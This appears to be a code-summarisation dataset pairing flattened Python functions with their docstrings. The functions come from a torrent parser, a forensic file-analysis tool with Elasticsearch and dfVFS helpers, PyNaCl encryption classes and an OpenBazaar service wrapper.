1	def parse_str(self): str_len = self._parse_number(delimiter=self.STR_LEN_VALUE_SEP) if not str_len: raise ParsingError('Empty string length found while parsing at position %d' % self.torr_str.pos) return self.torr_str.read(str_len)	Parse and return a string from the torrent file content. Format?:?Returns: Parsed string (from the current position). Raises: ParsingError, when expected string format is not encountered. TODO: . Explore using regex to accomplish the parsing.
1	def parse_int(self): self.step_back() if self.next_char() != TorrentParser.INT_START: raise ParsingError('Error while parsing for an integer. Found %s at position %d while %s is expected.' % (self.curr_char, self.torr_str.pos, TorrentParser.INT_START)) return self._parse_number(delimiter=self.INT_END)	Parse and return an integer from the torrent file content. Format i[0-9]+e Returns: Parsed integer (from the current position). Raises: ParsingError, when expected integer format is not encountered. TODO: . Explore using regex to accomplish the parsing. . Could re-purpose this function to parse str_length.
1	def _parse_number(self, delimiter): parsed_int = '' while True: parsed_int_char = self.next_char() if parsed_int_char not in string.digits: if parsed_int_char != delimiter: raise ParsingError('Invalid character %s found after parsing an integer (%s expected) at position %d.' % (parsed_int_char, delimiter, self.torr_str.pos)) else: break parsed_int += parsed_int_char return int(parsed_int) def __init__(self, torrent_file_path):	Parses a sequence of digits representing either an integer or string length and returns the number.
1	class _TorrentStr(object): STR_LEN_VALUE_SEP = ':' INT_END = 'e' def __init__(self, torr_str): self.torr_str = StringIO(torr_str) self.curr_char = None def next_char(self): self.curr_char = self.torr_str.read(1) return self.curr_char def step_back(self, position=-1, mode=1): self.torr_str.seek(position, mode) def parse_str(self): str_len = self._parse_number(delimiter=self.STR_LEN_VALUE_SEP) if not str_len: raise ParsingError('Empty string length found while parsing at position %d' % self.torr_str.pos) return self.torr_str.read(str_len) def parse_int(self): self.step_back() if self.next_char() != TorrentParser.INT_START: raise ParsingError('Error while parsing for an integer. Found %s at position %d while %s is expected.' % (self.curr_char, self.torr_str.pos, TorrentParser.INT_START)) return self._parse_number(delimiter=self.INT_END) def _parse_number(self, delimiter): parsed_int = '' while True: parsed_int_char = self.next_char() if parsed_int_char not in string.digits: if parsed_int_char != delimiter: raise ParsingError('Invalid character %s found after parsing an integer (%s expected) at position %d.' % (parsed_int_char, delimiter, self.torr_str.pos)) else: break parsed_int += parsed_int_char return int(parsed_int)	StringIO wrapper over the torrent string. TODO: . Create unittests to cover this class. . Should this rather extend StringIO class. Explore.
1	def check(self, evidence, path_on_disk): return True	Checks if the file is compatible with this plugin
1	def mimetype(self, mimetype): return "text/plain"	Returns the mimetype of this plugins get command
1	def get(self, evidence, helper, path_on_disk, request): if evidence['meta_type'] =='File' and not evidence['mimetype_known']: evidence['mimetype'] = helper.pathspec_helper.get_mimetype(evidence['pathspec']) evidence['mimetype_known'] = True plugins = [] other_plugins = {} size = evidence.get('size', 0) if isinstance(size, list): size = size[0] for pop in reversed(range(1, 11)): for plugin_name in helper.plugin_manager.get_all_plugins(): plugin = helper.plugin_manager.get_plugin_by_name(plugin_name) if plugin.popularity == pop: if plugin.display_name != 'Overview' and \ plugin.check(evidence, evidence['file_cache_path']) and \ (not plugin.cache or int(size) <= helper.max_file_size): logging.debug("Check matched, adding plugin " + plugin.display_name) plugins.append({ 'icon': getattr(plugin, 'icon', 'fa-file-o'), 'name': plugin_name, 'display_name': getattr(plugin, 'display_name', plugin_name) }) elif plugin.display_name != 'Overview': category = getattr(plugin, 'category', 'misc').lower() if not category in other_plugins: other_plugins[category] = [] other_plugins[category].append({ 'icon': getattr(plugin, 'icon', 'fa-file-o'), 'category': category, 'name': plugin_name, 'display_name': getattr(plugin, 'display_name', plugin_name) }) logging.debug("Check did not match, NOT adding plugin to matched " + plugin_name) theme = 'black' home = '/plugins/overview?' + evidence['url_query'] return render_template('analyze.html', evidence=evidence, theme=theme, plugins=plugins, other_plugins=other_plugins, home=home)	Provides a web view with all applicable plugins, defaults to most popular
1	def __init__(self, es_url=None): if es_url: self.elasticsearch = Elasticsearch([es_url]) else: self.elasticsearch = Elasticsearch()	Creates the Efetch indices in Elasticsearch if they do not exist
1	def create_index(self, index_name): self.elasticsearch.indices.create(index=index_name, ignore=400)	Create index in Elasticsearch with the provided name, ignoring error if it exists
1	def bulk(self, json): helpers.bulk(self.elasticsearch, json)	Bulk adds json to Elastic Search
1	def query(self, query, index, size=False): if size: query['size'] = size return self.elasticsearch.search(index=index, body=query)	Returns the results of an Elasticsearch query without error checking
1	def query_id(self, id, index, doc_type='_all'): if not id: logging.warn('No ID provided for query_id') return {} return self.elasticsearch.get(index=index, id=id, doc_type=doc_type)	Returns the result of an Elasticsearch request for the specified ID
1	def query_uuid(self, uuid, index): if not uuid: logging.warn('No uid provided for query_uuid') return {} query = {'query':{'term':{'uuid':uuid}}} query_result = self.query(query, index) if not 'hits' in query_result or 'hits' not in query_result['hits']: logging.error('Query failed for UUID, missing hits') return {} if len(query_result['hits']['hits']) > 1: logging.error('Multiple matching UUIDs') return {} elif len(query_result['hits']['hits']) == 0: logging.error('No results for UUID query') return {} return query_result['hits']['hits'][0]	Returns the result of an Elasticsearch request for the specified UID
1	def query_sources(self, query, index, size=False): return self.get_sources(self.query(query, index))	Returns the source values of an Elasticsearch query without error checking
1	def get_mappings(self, index): return self.elasticsearch.indices.get_mapping(index)	Returns the mapping for the given index
1	def update(self, id_value, index, update, doc_type, abort_on_error=True, repeat=1): try: self.elasticsearch.update(index=index, doc_type=doc_type, id=id_value, body={'doc': update}) except ConflictError: if repeat > 0: logging.info('Failed to update "' + id_value + '" attempting again in 200ms') time.sleep(.200) self.update(id, index, update, abort_on_error, repeat - 1) logging.warn('Failed to update "' + id_value + '" due to conflict error!')	Updates evidence event in Elastic Search
1	def scan(self, query, index, scroll=u'240m', size=10000): return helpers.scan(self.elasticsearch, query, index=index, scroll=scroll, size=size)	Runs Elasticsearch.helpers.scan returning a simple iterator that yields all hits
1	def get_query(self, a_parameter): try: a_parsed = rison.loads(a_parameter) except Exception, err: logging.error('Failed to parse rison: ' + a_parameter) traceback.print_exc() return {'query_string': {'analyze_wildcard': True, 'query': '*'}} if 'query' in a_parsed: return a_parsed['query'] else: return {'query_string': {'analyze_wildcard': True, 'query': '*'}}	Returns the query from _a RISON
1	def get_theme(self, a_parameter): try: a_parsed = rison.loads(a_parameter) except Exception, err: logging.error('Failed to parse rison: ' + a_parameter) traceback.print_exc() return 'gray' if 'options' in a_parsed and 'darkTheme' in a_parsed['options'] and a_parsed['options']['darkTheme']: return 'black' else: return 'gray'	Returns the theme from _a RISON
1	def get_filters(self, a_parameter, g_parameter, timefield, must=[], must_not=[]): a_parsed = rison.loads(a_parameter) g_parsed = rison.loads(g_parameter) if 'time' in g_parsed: must.append({'range': {timefield: { 'gte': g_parsed['time']['from'], 'lte': g_parsed['time']['to'] }}}) if 'filters' in a_parsed: for filter in a_parsed['filters']: if not filter['meta']['negate']: must.append({'query': filter['query']}) else: must_not.append({'query': filter['query']}) query = { 'query': { 'filtered': { 'query': { 'query_string': { 'query': '*', 'analyze_wildcard': True } } } } } if 'query' in a_parsed: must.append({'query': a_parsed['query']}) if not must and not must_not: return query query['query']['filtered']['filter'] = {'bool': {}} if must: query['query']['filtered']['filter']['bool']['must'] = must if must_not: query['query']['filtered']['filter']['bool']['must_not'] = must_not return query	Returns the query from _a RISON
1	def get_sources(self, query_result, abort_on_error=False): if not query_result['hits'] or not query_result['hits']['hits'] \ or not query_result['hits']['hits'][0]['_source']: logging.warn("Could not find any results from query.") return [] return query_result['hits']['hits'][0]['_source']	Gets the _source values out of an Elasticsearch query
1	def append_dict(self, dictionary, key, value): if not dictionary: dictionary = {} if not key in dictionary: dictionary[key] = value elif isinstance(dictionary[key], list): dictionary[key].append(value) else: dictionary[key] = [dictionary[key], value] return dictionary	Appends values to a dictionary in the format Elasticsearch expects
1	def __init__(self, source=None, settings=[u'all',u'all',u'all',u'all'], interactive=True, is_pathspec=False): super(DfvfsUtil, self).__init__() self._source_scanner = source_scanner.SourceScanner() self.settings = settings self.env = jinja2.Environment() self.env.filters['datetime'] = self.format_datetime if source and not is_pathspec: self.base_path_specs = self.get_base_pathspecs(source, interactive) elif source and is_pathspec: self.base_path_specs = self.get_base_from_pathspec(source, interactive)	Initializes the dfvfs util object.
1	def export_file(self, pathspec, output_path=None): file_entry = resolver.Resolver.OpenFileEntry(pathspec) in_file = file_entry.GetFileObject() if output_path: output = open(output_path, "wb") else: output = sys.stdout data = in_file.read(32768) while data: output.write(data) data = in_file.read(32768) if output_path: output.close()	Outputs a pathspec to the specified path
1	def get_pathspec_basic_information(self, pathspec): pathspec_information = {} pathspec_information['pathspec'] = self.encode_pathspec(pathspec) pathspec_information['path'] = pathspec.location pathspec_information['type_indicator'] = pathspec.type_indicator if pathspec_information['type_indicator'] == 'TSK': pathspec_information['inode'] = pathspec.inode pathspec_information['file_name'] = os.path.basename(pathspec_information['path']) pathspec_information['dir'] = os.path.dirname(pathspec_information['path']) pathspec_information['ext'] = os.path.splitext(pathspec_information['file_name'])[1][1:].lower() or "" return pathspec_information	Creates a dictionary of basic information about the pathspec without opening the file
1	def get_pathspec_information(self, pathspec): pathspec_information = self.get_pathspec_basic_information(pathspec) file_entry = resolver.Resolver.OpenFileEntry(pathspec) stat_object = file_entry.GetStat() for attribute in [ 'mtime', 'atime', 'ctime', 'crtime', 'size', 'mode', 'uid', 'gid']: pathspec_information[attribute] = str(getattr(stat_object, attribute, '')) pathspec_information['inode'] = getattr(stat_object, 'ino', '') type = getattr(stat_object, 'type', '') if type: if type == definitions.FILE_ENTRY_TYPE_DEVICE: pathspec_information['type'] = 'device' pathspec_information['legacy_type'] = 'b/b' if type == definitions.FILE_ENTRY_TYPE_DIRECTORY: pathspec_information['type'] = 'dir' pathspec_information['legacy_type'] = 'd/d' if type == definitions.FILE_ENTRY_TYPE_FILE: pathspec_information['type'] = 'file' pathspec_information['legacy_type'] = 'r/r' if type == definitions.FILE_ENTRY_TYPE_LINK: pathspec_information['type'] = 'link' pathspec_information['legacy_type'] = 'l/l' if type == definitions.FILE_ENTRY_TYPE_SOCKET: pathspec_information['type'] = 'socket' pathspec_information['legacy_type'] = 'h/h' if type == definitions.FILE_ENTRY_TYPE_PIPE: pathspec_information['type'] = 'pipe' pathspec_information['legacy_type'] = 'p/p' return pathspec_information	Creates a dictionary of information about the pathspec, must open the file in memory
1	show_pathspec=True, information=False, display_root=True, jinja_format=None): directory_list = [] if not pathspec: pathspec = self.base_path_specs if not isinstance(pathspec, list): pathspec = [pathspec] for individual_pathspec in pathspec: directory_list.extend(self._list_directory(resolver.Resolver.OpenFileEntry(individual_pathspec),recursive, display, 0, show_pathspec, information, display_root, jinja_format)) return directory_list	Lists a directory using a pathspec or list of pathspecs
1	def print_pathspec(self, pathspec=None, display_root=True, jinja_format=None): if not pathspec: pathspec = self.base_path_specs if not isinstance(pathspec, list): pathspec = [pathspec] for individual_pathspec in pathspec: self._print_file_entry(resolver.Resolver.OpenFileEntry(individual_pathspec), display_root=display_root, jinja_format=jinja_format)	Prints one or more pathspecs to standard out
1	def format_datetime(self, epoch, timezone=None): if timezone: timezone = pytz.timezone(timezone) if isinstance(epoch, str) and not epoch: epoch = 0 return datetime.datetime.fromtimestamp(float(epoch), timezone).isoformat()	Converts epoch time in seconds to ISO standard
1	def get_base_from_pathspec(self, source_pathspec, interactive): self.initialized = 0 scan_context = source_scanner.SourceScannerContext() scan_context.AddScanNode(source_pathspec, None) try: self._source_scanner.Scan(scan_context) except (errors.BackEndError, ValueError) as exception: raise RuntimeError( u'Unable to scan source with error: {0:s}.'.format(exception)) if scan_context.source_type not in [ definitions.SOURCE_TYPE_STORAGE_MEDIA_DEVICE, definitions.SOURCE_TYPE_STORAGE_MEDIA_IMAGE]: scan_node = scan_context.GetRootScanNode() return [scan_node.path_spec] scan_node = scan_context.GetRootScanNode() while len(scan_node.sub_nodes) == 1: scan_node = scan_node.sub_nodes[0] if scan_node.type_indicator != definitions.TYPE_INDICATOR_TSK_PARTITION: partition_identifiers = None else: partition_identifiers = self._get_tsk_partition_identifiers(scan_node, interactive) if self.initialized < 0: return base_path_specs = [] if not partition_identifiers: self._scan_volume(scan_context, scan_node, base_path_specs, interactive) else: for partition_identifier in partition_identifiers: location = u'/{0:s}'.format(partition_identifier) sub_scan_node = scan_node.GetSubNodeByLocation(location) self._scan_volume(scan_context, sub_scan_node, base_path_specs, interactive) if self.initialized < 0: return else: self.initialized = 1 if not base_path_specs: raise RuntimeError( u'No supported file system found in source.') return base_path_specs	Determines the base path specifications. Args: source_path: the source path. Returns: A list of path specifications (instances of dfvfs.PathSpec). Raises: RuntimeError: if the source path does not exists, or if the source path is not a file or directory, or if the format of or within the source file is not supported.
1	def get_base_pathspecs(self, source_path, interactive): self.initialized = 0 if (not source_path.startswith(u'\\\\.\\') and not os.path.exists(source_path)): raise RuntimeError( u'No such device, file or directory: {0:s}.'.format(source_path)) scan_context = source_scanner.SourceScannerContext() scan_context.OpenSourcePath(source_path) try: self._source_scanner.Scan(scan_context) except (errors.BackEndError, ValueError) as exception: raise RuntimeError( u'Unable to scan source with error: {0:s}.'.format(exception)) if scan_context.source_type not in [ definitions.SOURCE_TYPE_STORAGE_MEDIA_DEVICE, definitions.SOURCE_TYPE_STORAGE_MEDIA_IMAGE]: scan_node = scan_context.GetRootScanNode() return [scan_node.path_spec] scan_node = scan_context.GetRootScanNode() while len(scan_node.sub_nodes) == 1: scan_node = scan_node.sub_nodes[0] if scan_node.type_indicator != definitions.TYPE_INDICATOR_TSK_PARTITION: partition_identifiers = None else: partition_identifiers = self._get_tsk_partition_identifiers(scan_node, interactive) if self.initialized < 0: return base_path_specs = [] if not partition_identifiers: self._scan_volume(scan_context, scan_node, base_path_specs, interactive) else: for partition_identifier in partition_identifiers: location = u'/{0:s}'.format(partition_identifier) sub_scan_node = scan_node.GetSubNodeByLocation(location) self._scan_volume(scan_context, sub_scan_node, base_path_specs, interactive) if self.initialized < 0: return else: self.initialized = 1 if not base_path_specs: raise RuntimeError( u'No supported file system found in source.') return base_path_specs	Determines the base path specifications. Args: source_path: the source path. Returns: A list of path specifications (instances of dfvfs.PathSpec). Raises: RuntimeError: if the source path does not exists, or if the source path is not a file or directory, or if the format of or within the source file is not supported.
1	show_pathspec=True, information=False, display_root=False, jinja_format=None): directory_list = [] if information: directory_list.append(self.get_pathspec_information(file_entry.path_spec)) else: directory_list.append(file_entry.name) if display: self._print_file_entry(file_entry, depth, show_pathspec, display_root, jinja_format) if (recursive or depth == 0) and file_entry.IsDirectory(): for sub_file_entry in file_entry.sub_file_entries: directory_list.extend(self._list_directory(sub_file_entry, recursive, display, depth + 1, show_pathspec, information, display_root, jinja_format)) return directory_list	Lists a directory using a file entry
1	jinja_format='{{name}}\t{{pathspec}}'): if not display_root and depth == 0: return elif not display_root: depth -= 1 if not jinja_format: jinja_format = '{{name}}\t{{pathspec}}' template = self.env.from_string(jinja_format) information = self.get_pathspec_information(file_entry.path_spec) information['padded_file_name'] = information['file_name'] + \ (' ' * max(0, 32 - len(information['file_name']))) information['name'] = file_entry.name if depth == 0 and not information['name']: if hasattr(file_entry.path_spec.parent, 'location'): information['name'] = file_entry.path_spec.parent.location else: information['name'] = '/' if depth == 0 and not information['name']: if hasattr(file_entry.path_spec.parent, 'location'): information['name'] = file_entry.path_spec.parent.location else: information['name'] = '/' information['depth'] = '+' * depth information['legacy_type'] = '' if information['type'] == 'dir': information['legacy_type'] = 'd/d' else: information['legacy_type'] = 'r/r' print(template.render(information))	Prints a file entry to standard out
1	def _format_human_readable_size(self, size): magnitude_1000 = 0 size_1000 = float(size) while size_1000 >= 1000: size_1000 /= 1000 magnitude_1000 += 1 magnitude_1024 = 0 size_1024 = float(size) while size_1024 >= 1024: size_1024 /= 1024 magnitude_1024 += 1 size_string_1000 = None if magnitude_1000 > 0 and magnitude_1000 <= 7: size_string_1000 = u'{0:.1f}{1:s}'.format( size_1000, self._UNITS_1000[magnitude_1000]) size_string_1024 = None if magnitude_1024 > 0 and magnitude_1024 <= 7: size_string_1024 = u'{0:.1f}{1:s}'.format( size_1024, self._UNITS_1024[magnitude_1024]) if not size_string_1000 or not size_string_1024: return u'{0:d} B'.format(size) return u'{0:s} / {1:s} ({2:d} B)'.format( size_string_1024, size_string_1000, size)	Formats the size as a human readable string. Args: size: The size in bytes. Returns: A human readable string of the size.
1	def _get_tsk_partition_identifiers(self, scan_node, interactive): if not scan_node or not scan_node.path_spec: raise RuntimeError(u'Invalid scan node.') volume_system = tsk_volume_system.TSKVolumeSystem() volume_system.Open(scan_node.path_spec) volume_identifiers = self._source_scanner.GetVolumeIdentifiers( volume_system) if not volume_identifiers: print(u'[WARNING] No partitions found.') return if len(volume_identifiers) == 1: return volume_identifiers return volume_identifiers	Determines the TSK partition identifiers. Args: scan_node: the scan node (instance of dfvfs.ScanNode). Returns: A list of partition identifiers. Raises: RuntimeError: if the format of or within the source is not supported or the the scan node is invalid or if the volume for a specific identifier cannot be retrieved.
1	def _get_vss_store_identifiers(self, scan_node, interactive): if not scan_node or not scan_node.path_spec: raise RuntimeError(u'Invalid scan node.') volume_system = vshadow_volume_system.VShadowVolumeSystem() volume_system.Open(scan_node.path_spec) volume_identifiers = self._source_scanner.GetVolumeIdentifiers( volume_system) if not volume_identifiers: return [] try: selected_store_identifiers = self._prompt_user_for_vss_store_identifiers( volume_system, volume_identifiers, interactive) except KeyboardInterrupt: raise errors.UserAbort(u'File system scan aborted.') return selected_store_identifiers	Determines the VSS store identifiers. Args: scan_node: the scan node (instance of dfvfs.ScanNode). Returns: A list of VSS store identifiers. Raises: RuntimeError: if the format of or within the source is not supported or the the scan node is invalid.
1	self, scan_context, locked_scan_node, credentials): if locked_scan_node.type_indicator == definitions.TYPE_INDICATOR_BDE: print(u'Found a BitLocker encrypted volume.') else: print(u'Found an encrypted volume.') credentials_list = list(credentials.CREDENTIALS) credentials_list.append(u'skip') print(u'Supported credentials:') print(u'') for index, name in enumerate(credentials_list): print(u' {0:d}. {1:s}'.format(index, name)) print(u'') print(u'Note that you can abort with Ctrl^C.') print(u'') result = False while not result: print(u'Select a credential to unlock the volume: ', end=u'') input_line = sys.stdin.readline() self.settings.append(input_line.strip()) input_line = input_line.strip() if input_line in credentials_list: credential_type = input_line else: try: credential_type = int(input_line, 10) credential_type = credentials_list[credential_type] except (IndexError, ValueError): print(u'Unsupported credential: {0:s}'.format(input_line)) continue if credential_type == u'skip': break credential_data = getpass.getpass(u'Enter credential data: ') print(u'') if credential_type == u'key': try: credential_data = credential_data.decode(u'hex') except TypeError: print(u'Unsupported credential data.') continue result = self._source_scanner.Unlock( scan_context, locked_scan_node.path_spec, credential_type, credential_data) if not result: print(u'Unable to unlock volume.') print(u'') return result	Prompts the user to provide a credential for an encrypted volume. Args: scan_context: the source scanner context (instance of SourceScannerContext). locked_scan_node: the locked scan node (instance of SourceScanNode). credentials: the credentials supported by the locked scan node (instance of dfvfs.Credentials). Returns: A boolean value indicating whether the volume was unlocked.
1	self, volume_system, volume_identifiers, interactive): if interactive: print(u'The following partitions were found:') print(u'Identifier\tOffset (in bytes)\tSize (in bytes)') else: self.display = u'The following partitions were found: \nIdentifier\tOffset (in bytes)\tSize (in bytes)\n' for volume_identifier in sorted(volume_identifiers): volume = volume_system.GetVolumeByIdentifier(volume_identifier) if not volume: raise errors.FileSystemScannerError( u'Volume missing for identifier: {0:s}.'.format(volume_identifier)) volume_extent = volume.extents[0] if interactive: print(u'{0:s}\t\t{1:d} (0x{1:08x})\t{2:s}'.format( volume.identifier, volume_extent.offset, self._format_human_readable_size(volume_extent.size))) else: self.display += u'{0:s}\t\t{1:d} (0x{1:08x})\t{2:s}\n'.format( volume.identifier, volume_extent.offset, self._format_human_readable_size(volume_extent.size)) return u'all'	Prompts the user to provide a partition identifier. Args: volume_system: The volume system (instance of dfvfs.TSKVolumeSystem). volume_identifiers: List of allowed volume identifiers. Returns: A string containing the partition identifier or "all". Raises: FileSystemScannerError: if the source cannot be processed.
1	def _scan_volume(self, scan_context, volume_scan_node, base_path_specs, interactive): if not volume_scan_node or not volume_scan_node.path_spec: raise RuntimeError(u'Invalid or missing volume scan node.') if len(volume_scan_node.sub_nodes) == 0: self._scan_volume_scan_node(scan_context, volume_scan_node, base_path_specs, interactive) else: for sub_scan_node in volume_scan_node.sub_nodes: self._scan_volume_scan_node(scan_context, sub_scan_node, base_path_specs, interactive) if self.initialized < 0: return	Scans the volume scan node for volume and file systems. Args: scan_context: the source scanner context (instance of SourceScannerContext). volume_scan_node: the volume scan node (instance of dfvfs.ScanNode). base_path_specs: a list of source path specification (instances of dfvfs.PathSpec). Raises: RuntimeError: if the format of or within the source is not supported or the the scan node is invalid.
1	self, scan_context, volume_scan_node, base_path_specs, interactive): if not volume_scan_node or not volume_scan_node.path_spec: raise RuntimeError(u'Invalid or missing volume scan node.') scan_node = volume_scan_node while len(scan_node.sub_nodes) == 1: scan_node = scan_node.sub_nodes[0] if scan_node.type_indicator in definitions.ENCRYPTED_VOLUME_TYPE_INDICATORS: self._scan_volume_scan_node_encrypted( scan_context, scan_node, base_path_specs, interactive) elif scan_node.type_indicator == definitions.TYPE_INDICATOR_VSHADOW: self._scan_volume_scan_node_vss(scan_context, scan_node, base_path_specs, interactive) elif scan_node.type_indicator in definitions.FILE_SYSTEM_TYPE_INDICATORS: base_path_specs.append(scan_node.path_spec)	Scans an individual volume scan node for volume and file systems. Args: scan_context: the source scanner context (instance of SourceScannerContext). volume_scan_node: the volume scan node (instance of dfvfs.ScanNode). base_path_specs: a list of source path specification (instances of dfvfs.PathSpec). Raises: RuntimeError: if the format of or within the source is not supported or the the scan node is invalid.
1	self, scan_context, volume_scan_node, base_path_specs, interactive): result = not scan_context.IsLockedScanNode(volume_scan_node.path_spec) if not result: credentials = credentials_manager.CredentialsManager.GetCredentials( volume_scan_node.path_spec) result = self._prompt_user_for_encrypted_volume_credential( scan_context, volume_scan_node, credentials, interactive) if result: self._source_scanner.Scan( scan_context, scan_path_spec=volume_scan_node.path_spec) self._scan_volume(scan_context, volume_scan_node, base_path_specs, interactive)	Scans an encrypted volume scan node for volume and file systems. Args: scan_context: the source scanner context (instance of SourceScannerContext). volume_scan_node: the volume scan node (instance of dfvfs.ScanNode). base_path_specs: a list of source path specification (instances of dfvfs.PathSpec).
1	class BadSignatureError(CryptoError):	Raised when the signature was forged or otherwise corrupt.
1	def encrypt(self, plaintext, nonce, encoder=encoding.RawEncoder): if len(nonce) != self.NONCE_SIZE: raise ValueError("The nonce must be exactly %s bytes long" % self.NONCE_SIZE) ciphertext = nacl.bindings.crypto_box_afternm( plaintext, nonce, self._shared_key, ) encoded_nonce = encoder.encode(nonce) encoded_ciphertext = encoder.encode(ciphertext) return EncryptedMessage._from_parts( encoded_nonce, encoded_ciphertext, encoder.encode(nonce + ciphertext), )	Encrypts the plaintext message using the given `nonce` and returns the ciphertext encoded with the encoder. .. warning:: It is **VITALLY** important that the nonce is a nonce, i.e. it is a number used only once for any given key. If you fail to do this, you compromise the privacy of the messages encrypted. :param plaintext: [:class:`bytes`] The plaintext message to encrypt :param nonce: [:class:`bytes`] The nonce to use in the encryption :param encoder: The encoder to use to encode the ciphertext :rtype: [:class:`nacl.utils.EncryptedMessage`]
1	def decrypt(self, ciphertext, nonce=None, encoder=encoding.RawEncoder): ciphertext = encoder.decode(ciphertext) if nonce is None: nonce = ciphertext[:self.NONCE_SIZE] ciphertext = ciphertext[self.NONCE_SIZE:] if len(nonce) != self.NONCE_SIZE: raise ValueError("The nonce must be exactly %s bytes long" % self.NONCE_SIZE) plaintext = nacl.bindings.crypto_box_open_afternm( ciphertext, nonce, self._shared_key, ) return plaintext	Decrypts the ciphertext using the given nonce and returns the plaintext message. :param ciphertext: [:class:`bytes`] The encrypted message to decrypt :param nonce: [:class:`bytes`] The nonce used when encrypting the ciphertext :param encoder: The encoder used to decode the ciphertext. :rtype: [:class:`bytes`]
1	def encrypt(self, plaintext, nonce, encoder=encoding.RawEncoder): if len(nonce) != self.NONCE_SIZE: raise ValueError("The nonce must be exactly %s bytes long" % self.NONCE_SIZE) ciphertext = nacl.bindings.crypto_box_afternm( plaintext, nonce, self._shared_key, ) encoded_nonce = encoder.encode(nonce) encoded_ciphertext = encoder.encode(ciphertext) return EncryptedMessage._from_parts( encoded_nonce, encoded_ciphertext, encoder.encode(nonce + ciphertext), )	Encrypts the plaintext message using the given `nonce` and returns the ciphertext encoded with the encoder. .. warning:: It is **VITALLY** important that the nonce is a nonce, i.e. it is a number used only once for any given key. If you fail to do this, you compromise the privacy of the messages encrypted. :param plaintext: [:class:`bytes`] The plaintext message to encrypt :param nonce: [:class:`bytes`] The nonce to use in the encryption :param encoder: The encoder to use to encode the ciphertext :rtype: [:class:`nacl.utils.EncryptedMessage`]
1	def decrypt(self, ciphertext, nonce=None, encoder=encoding.RawEncoder): ciphertext = encoder.decode(ciphertext) if nonce is None: nonce = ciphertext[:self.NONCE_SIZE] ciphertext = ciphertext[self.NONCE_SIZE:] if len(nonce) != self.NONCE_SIZE: raise ValueError("The nonce must be exactly %s bytes long" % self.NONCE_SIZE) plaintext = nacl.bindings.crypto_box_open_afternm( ciphertext, nonce, self._shared_key, ) return plaintext	Decrypts the ciphertext using the given nonce and returns the plaintext message. :param ciphertext: [:class:`bytes`] The encrypted message to decrypt :param nonce: [:class:`bytes`] The nonce used when encrypting the ciphertext :param encoder: The encoder used to decode the ciphertext. :rtype: [:class:`bytes`]
1	class Box(encoding.Encodable, StringFixer, object): NONCE_SIZE = nacl.bindings.crypto_box_NONCEBYTES def __init__(self, private_key, public_key): if private_key and public_key: if ((not isinstance(private_key, PrivateKey) or not isinstance(public_key, PublicKey))): raise TypeError("Box must be created from " "a PrivateKey and a PublicKey") self._shared_key = nacl.bindings.crypto_box_beforenm( public_key.encode(encoder=encoding.RawEncoder), private_key.encode(encoder=encoding.RawEncoder), ) else: self._shared_key = None def __bytes__(self): return self._shared_key def decode(cls, encoded, encoder=encoding.RawEncoder): box = cls(None, None) box._shared_key = encoder.decode(encoded) return box def encrypt(self, plaintext, nonce, encoder=encoding.RawEncoder): if len(nonce) != self.NONCE_SIZE: raise ValueError("The nonce must be exactly %s bytes long" % self.NONCE_SIZE) ciphertext = nacl.bindings.crypto_box_afternm( plaintext, nonce, self._shared_key, ) encoded_nonce = encoder.encode(nonce) encoded_ciphertext = encoder.encode(ciphertext) return EncryptedMessage._from_parts( encoded_nonce, encoded_ciphertext, encoder.encode(nonce + ciphertext), ) def decrypt(self, ciphertext, nonce=None, encoder=encoding.RawEncoder): ciphertext = encoder.decode(ciphertext) if nonce is None: nonce = ciphertext[:self.NONCE_SIZE] ciphertext = ciphertext[self.NONCE_SIZE:] if len(nonce) != self.NONCE_SIZE: raise ValueError("The nonce must be exactly %s bytes long" % self.NONCE_SIZE) plaintext = nacl.bindings.crypto_box_open_afternm( ciphertext, nonce, self._shared_key, ) return plaintext	The Box class boxes and unboxes messages between a pair of keys The ciphertexts generated by :class:`~nacl.public.Box` include a 16 byte authenticator which is checked as part of the decryption. An invalid authenticator will cause the decrypt function to raise an exception. The authenticator is not a signature. Once you've decrypted the message you've demonstrated the ability to create arbitrary valid message, so messages you send are repudiable. For non-repudiable messages, sign them after encryption. :param private_key: :class:`~nacl.public.PrivateKey` used to encrypt and decrypt messages :param public_key: :class:`~nacl.public.PublicKey` used to encrypt and decrypt messages :cvar NONCE_SIZE: The size that the nonce is required to be.
1	class CryptoError(Exception): class BadSignatureError(CryptoError):	Base exception for all nacl related errors
1	def nonce(self): return self._nonce	The nonce used during the encryption of the :class:`EncryptedMessage`.
1	def ciphertext(self): return self._ciphertext	The ciphertext contained within the :class:`EncryptedMessage`.
1	def nonce(self): return self._nonce	The nonce used during the encryption of the :class:`EncryptedMessage`.
1	def ciphertext(self): return self._ciphertext	The ciphertext contained within the :class:`EncryptedMessage`.
1	class EncryptedMessage(six.binary_type): def _from_parts(cls, nonce, ciphertext, combined): obj = cls(combined) obj._nonce = nonce obj._ciphertext = ciphertext return obj def nonce(self): return self._nonce @property def ciphertext(self): return self._ciphertext class StringFixer(object):	A bytes subclass that holds a messaged that has been encrypted by a :class:`SecretBox`.
1	class OpenBazaarService(win32serviceutil.ServiceFramework): _svc_name_ = SERVICE_NAME _svc_display_name_ = SERVICE_DISPLAY_NAME _svc_deps_ = None _svc_description_ = SERVICE_DESCRIPTION def SvcDoRun(self): subprocess.Popen(["python", "../OpenBazaar-Server/openbazaard.py", "start"]) def SvcStop(self): subprocess.Popen(["python", "../OpenBazaar-Server/openbazaard.py", "stop"]) if __name__ == '__main__':	OpenBazaar Server Service.
1	def generate(cls): return cls(random(PrivateKey.SIZE), encoder=encoding.RawEncoder)	Generates a random :class:`~nacl.public.PrivateKey` object :rtype: :class:`~nacl.public.PrivateKey`
1	def generate(cls): return cls(random(PrivateKey.SIZE), encoder=encoding.RawEncoder)	Generates a random :class:`~nacl.public.PrivateKey` object :rtype: :class:`~nacl.public.PrivateKey`
